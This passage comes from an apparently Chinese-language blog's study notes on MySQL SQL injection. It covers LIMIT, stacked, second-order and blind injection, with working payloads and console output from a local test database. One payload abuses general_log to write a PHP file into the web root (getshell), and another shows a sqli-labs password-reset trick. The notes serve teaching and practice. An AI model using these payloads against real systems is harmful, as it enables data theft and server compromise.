1,2;</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">+------+-----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from math limit 1,3;</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">+------+-----------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><ul><li><p>benchmark</p><p>benchmark函数有两个参数，第一个是执行次数，第二个是要测试的函数或者表达式 .</p></li></ul></li><li><p>limit注入</p><ul><li><p>注入点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select*from math limit 1,[可控点] </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select*from math order by id desc limit 1,2</span><br></pre></td></tr></table></figure><p>limit后面能够拼接的函数只有into和procedure。</p></li><li><p>无order by关键字</p><ul><li><p>使用union联合查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from math order by id desc limit 0,1 union select username from users;</span><br></pre></td></tr></table></figure></li><li><p>报错注入(5.0.0&lt; MySQL &lt;5.6.6版本)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *  from math order by id desc limit 0,1  procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure></li><li><p>延时注入(5.0.0&lt; MySQL &lt;5.6.6版本)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *  from math order by id desc limit 0,1 procedure analyse(if(substring(version(),1,1)&#x3D;5,benchmark(50000000,encode(&#39;msg&#39;,&#39;by 5 second&#39;)),0),1)</span><br></pre></td></tr></table></figure><p>只能使用BENCHMARK，而不能使用sleep</p></li></ul></li><li><p>有order by关键字</p><p>无法使用union关键字，可尝试盲注或者报错</p><ul><li><p>报错注入(5.0.0&lt; MySQL &lt;5.6.6版本)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *  from math order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure></li><li><p>延时注入(5.0.0&lt; MySQL &lt;5.6.6版本)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *  from math order by id desc limit 0,1 procedure analyse(if(substring(version(),1,1)&#x3D;5,benchmark(50000000,encode(&#39;msg&#39;,&#39;by 5 second&#39;)),0),1)</span><br></pre></td></tr></table></figure><p>只能使用BENCHMARK，而不能使用sleep</p></li></ul></li></ul></li></ul><h5 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h5><p>定义</p><p>堆叠可以理解为多个sql语句放在一起，一起执行，在mysql命令行中我们的sql语句是以分号分割的，所以我们在sql注入的时候可以考虑，是否可以进行多语句执行注入。例如在mysql中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select  * from  math;select user();</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|   25 | gongcheng |</span><br><span class="line">|    3 | chengxian |</span><br><span class="line">|   25 | gongcheng |</span><br><span class="line">+------+-----------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">+----------------+</span><br><span class="line">| user()         |</span><br><span class="line">+----------------+</span><br><span class="line">| root@localhost |</span><br><span class="line">+----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>而union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</p><p>原理：</p><ul><li><p>mysql_query与mysqli-&gt;multi_query()</p><p>mysql_query() 函数执行一条 MySQL 查询。</p><p>mysqli_multi_query()支持多查询，多查询使用多个分号进行分隔。</p></li><li><p>利用配合日志getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1;set global general_log&#x3D;&#39;on&#39;;set global general_log_file&#x3D;&#39;D:\\wwwroot\\web\\shell.php&#39;;#</span><br><span class="line">id&#x3D;1;select &#39;&lt;?php phpinfo();?&gt;&#39;;#</span><br></pre></td></tr></table></figure></li></ul><h5 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h5><ul><li><p>原理：</p><p>用户第一次输入的数据，经过各种函数处理比如<code>addslashes</code>或者<code>get_magic_quotes_gpc</code>之后，仍然被原封不动的保存在数据库中，即存入了脏数据，当程序从数据库中取出脏数据的时候，进而产生了二次注入。</p></li><li><p>实例：</p><p>sqlib-24</p><p>我们需要先去注册一个用户名为admin’ #的用户，用户名存入数据库，当我们需要修改当前用户的密码的时候，我们直接输入用户名，无须输入密码即可成功修改。</p><p>程序从数据库中取出脏数据后，执行的sql语句就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;admin&#39;#&#39; and password&#x3D;&#39;$curr_pass&#39;</span><br></pre></td></tr></table></figure></li></ul><h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><ul><li><p>原理：</p><p>指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入。盲注一般分为布尔盲注和基于时间的盲注。</p><p>盲注分为两类：<br> 　　　1.布尔盲注　布尔很明显Ture跟Fales，也就是说它只会根据你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。<br> 　　　2.时间盲注　界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。</p></li><li><p>常用函数</p><h5 id="IF"><a href="#IF" class="headerlink" title="IF()"></a>IF()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF(expr1,expr2,expr3)</span><br></pre></td></tr></table></figure><p>如果 expr1 是TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定。</p><h5 id="MID"><a href="#MID" class="headerlink" title="MID()"></a>MID()</h5><p>MID() 函数用于从文本字段中提取字符。</p><p><code>SELECT MID(column_name,start[,length]) FROM table_name;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT MID(&#39;NowaMagic&#39;,1,2);</span><br><span class="line">+----------------------+</span><br><span class="line">| MID(&#39;NowaMagic&#39;,1,2) |</span><br><span class="line">+----------------------+</span><br><span class="line">| No                   |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT MID(&#39;NowaMagic&#39;,1,3);</span><br><span class="line">+----------------------+</span><br><span class="line">| MID(&#39;NowaMagic&#39;,1,3) |</span><br><span class="line">+----------------------+</span><br><span class="line">| Now                  |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT MID(&#39;NowaMagic&#39;,0,3);</span><br><span class="line">+----------------------+</span><br><span class="line">| MID(&#39;NowaMagic&#39;,0,3) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                      |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure><p><strong>substr()</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,3);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,1,3) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| Now                     |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,1);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,1,1) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| N                       |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,2,1);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,2,1) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| o                       |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,3,1);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,3,1) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| w                       |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,3);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,1,3) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| Now                     |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,2);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,1,2) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| No                      |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,0,2);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,0,2) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                         |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,0,1);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,0,1) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                         |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p><strong>case()</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select case 2 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end;</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| case 2 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| two                                                        |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select case 1 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end;</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| case 1 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| one                                                        |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select case 3 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end;</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| case 3 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| more                                                       |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h5 id="ord"><a href="#ord" class="headerlink" title="ord()"></a>ord()</h5><p>ORD() 函数返回字符串第一个字符的 <a href="http://www.nowamagic.net/academy/tag/ASCII">ASCII</a> 值。</p><h5 id="ELT-N-str1-str2-str3-…"><a href="#ELT-N-str1-str2-str3-…" class="headerlink" title="ELT(N,str1,str2,str3,…)"></a>ELT(N,str1,str2,str3,…)</h5><p>如果N =1返回str1，如果N= 2返回str2，等等。返回NULL如果参数的数量小于1或大于N。ELT()是FIELD()的补集。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT ELT(1, &#39;ej&#39;, &#39;Heja&#39;, &#39;hej&#39;, &#39;foo&#39;);</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">| ELT(1, &#39;ej&#39;, &#39;Heja&#39;, &#39;hej&#39;, &#39;foo&#39;)                      |</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">| ej                                                      |</span><br><span class="line">+---------------------------------------------------------+</span><br></pre></td></tr></table></figure></li><li><p>sleep()、BENCHMARK()</p></li><li><p>笛卡尔积</p><p>原理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AxB&#x3D;A和B中每个元素的组合所组成的集合，就是连接表</span><br></pre></td></tr></table></figure><p>具体的方式就是将简单的表查询不断的叠加，使之以指数倍运算量的速度增长，不断增加系统执行 sql 语句的负荷，直到产生攻击者想要的时间延迟，利用系统自带的表和字段来完成攻击。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT count(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C;</span><br></pre></td></tr></table></figure><p>根据数据库查询的特点，这句话的意思就是将 A B C 三个表进行笛卡尔积（全排列），并输出 最终的行数。</p><p>实例：</p><p>配合if</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table where id &#x3D; 1 and (if(substr(database(),1,1)&#x3D;&#39; &#39;, select count(*) from information_schema.columns A, information_schema.columns B,information_schema.columns C, null))</span><br></pre></td></tr></table></figure></li><li><p>Get_lock() 加锁机制</p><p>在单数据库的环境下，如果想防止多个线程操作同一个表（多个线程可能分布在不同的机器上），可以使用这种方式，取表名为key，操作前进行加锁，操作结束之后进行释放，这样在多个线程的时候，即保证了单个表的串行操作，又保证了多个不同表的并行操作。</p><p>(1)GET_LOCK有两个参数，一个是key,表示要加锁的字段，另一个是加锁失败后的等待时间(s)，一个客户端对某个字段加锁以后另一个客户端再想对这个字段加锁就会失败，然后就会等待设定好的时间</p><p>(2)当调用 RELEASE_LOCK来释放上面加的锁或客户端断线了，上面的锁才会释放，其它的客户端才能进来。</p><p>原理：</p><p>尝试对一个字段加锁</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select get_lock(&#39;username&#39;,10);</span><br><span class="line">  +-------------------------+</span><br><span class="line">| get_lock(&#39;username&#39;,10) |</span><br><span class="line">  +-------------------------+</span><br><span class="line">  |                       1 |</span><br><span class="line">  +-------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>尝试开启另一个客户端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select get_lock(&#39;username&#39;,10);</span><br><span class="line">+-------------------------+</span><br><span class="line">| get_lock(&#39;username&#39;,10) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       0 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (10.01 sec)</span><br></pre></td></tr></table></figure><p>实例：</p><p>对有一个字段加锁</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from ctf where flag &#x3D; 1 and get_lock(&#39;username&#39;,1);</span><br></pre></td></tr></table></figure><p>再次加锁(配合if)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from ctf where flag &#x3D; 1 and 1 and if(substr(database(),1,1),get_lock(&#39;username&#39;,5),null);</span><br></pre></td></tr></table></figure><p>限制条件：</p><p>限制条件就是数据库的连接必须是持久连接，我们知道 mysql_connect() 连接数据库后开始查询，然后调用 mysql_close()  关闭与数据库的连接，也就是 web  服务器与数据库服务器连接的生命周期就是整个脚本运行的生命周期，脚本结束连接即断开，但是很明显这里我们要利用的是前一个连接对后一个连接的阻碍作用导致延时，所以这里的连接必须是持久的。在Apache+PHP搭建的环境中需要使用 mysql_pconnect函数来连接数据库。</p></li><li><p>其他盲注函数–mysql中用regexp是区分大小写的</p><ul><li><p>lpad和rpad函数</p><p>lpad(sourceStr, length, newStr)，将字符串newStr填补到sourceStr左边，直到sourceStr长度达到length。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select lpad(1,5,2);</span><br><span class="line">+-------------+</span><br><span class="line">| lpad(1,5,2) |</span><br><span class="line">+-------------+</span><br><span class="line">| 22221       |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li></ul><p>配合盲注</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select length(lpad(1,(select length(database())),2));</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| length(lpad(1,(select length(database())),2)) |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">|                                             4 |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select lpad(1,(select length(database())),2);</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| lpad(1,(select length(database())),2) |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| 2221                                  |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><ul><li><p>like和regexp:</p><p>Like:</p><p>% : 匹配0个或任意多个字符</p><p>_ : 匹配任意一个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database();</span><br><span class="line">+------------+</span><br><span class="line">| database() |</span><br><span class="line">+------------+</span><br><span class="line">| test       |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>判断第一个字符是否是t</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database() like &#39;t%&#39;;</span><br><span class="line">+----------------------+</span><br><span class="line">| database() like &#39;t%&#39; |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    1 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>判断前两个字符是不是te</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database() like &#39;te%&#39;;</span><br><span class="line">+-----------------------+</span><br><span class="line">| database() like &#39;te%&#39; |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     1 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>判断是否包含es两个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database() like &#39;%es%&#39;;</span><br><span class="line">+------------------------+</span><br><span class="line">| database() like &#39;%es%&#39; |</span><br><span class="line">+------------------------+</span><br><span class="line">|                      1 |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>判断有几个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database() like &#39;_____&#39;;</span><br><span class="line">+-------------------------+</span><br><span class="line">| database() like &#39;_____&#39; |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       0 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select database() like &#39;____&#39;;</span><br><span class="line">+------------------------+</span><br><span class="line">| database() like &#39;____&#39; |</span><br><span class="line">+------------------------+</span><br><span class="line">|                      1 |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>判断第一个字符是否t</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database() like &#39;t___&#39;;</span><br><span class="line">+------------------------+</span><br><span class="line">| database() like &#39;t___&#39; |</span><br><span class="line">+------------------------+</span><br><span class="line">|                      1 |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>like配合盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from math where id &#x3D;1 and if((select database() like &#39;t___&#39;),1,0);</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | 444       |</span><br><span class="line">|    1 | 444       |</span><br><span class="line">+------+-----------+</span><br><span class="line">6 rows in set (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from math where id &#x3D;1 and if((select database() like &#39;s___&#39;),1,0);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure><p>注意点就是如果匹配成功就会返回1否则就是0。</p><p>REGEXP:</p><p>盲注值正则表达式攻击(^、&amp;)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select name from math where id&#x3D;3;</span><br><span class="line">+-----------+</span><br><span class="line">| name      |</span><br><span class="line">+-----------+</span><br><span class="line">| chengxian |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;^c&#39;;</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| (select name from math where id&#x3D;3) regexp&#39;^c&#39; |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">|                                             1 |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;^s&#39;;</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| (select name from math where id&#x3D;3) 